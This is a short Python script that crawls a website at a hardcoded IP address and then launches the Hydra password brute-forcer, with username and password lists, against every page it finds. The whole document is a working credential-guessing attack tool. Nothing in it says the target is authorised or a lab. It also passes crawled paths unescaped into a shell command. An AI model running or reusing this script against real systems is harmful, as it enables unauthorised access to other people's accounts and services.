import requests
from bs4 import BeautifulSoup
import os
from urllib.parse import urljoin

base_url = "http://18.188.93.218"
visited = set()

def traverse_website(url, max_depth=3, depth=0):
    if depth > max_depth:
        return
    
    try:
        response = requests.get(url)
        if response.status_code != 200:
            return
        soup = BeautifulSoup(response.text, 'html.parser')
        links = [a['href'] for a in soup.find_all('a', href=True)]
        for link in links:
            full_url = urljoin(url, link)
            if full_url not in visited and base_url in full_url:
                visited.add(full_url)
                print(f"Found URL: {full_url}")
                traverse_website(full_url, max_depth, depth + 1)
    except requests.RequestException as e:
        print(f"Error accessing {url}: {e}")

# Start crawling from the base URL
traverse_website(base_url)

# Run Hydra using http-get on each discovered page
for page in visited:
    page_path = page.replace(base_url, "").lstrip("/")  #no leading slash if it exists
    print(f"Running Hydra on {page}...")

    # Using http-get 
    os.system(f"hydra -L usernames.txt -P passwords.txt 18.188.93.218 http-get \"/{page_path}\"")
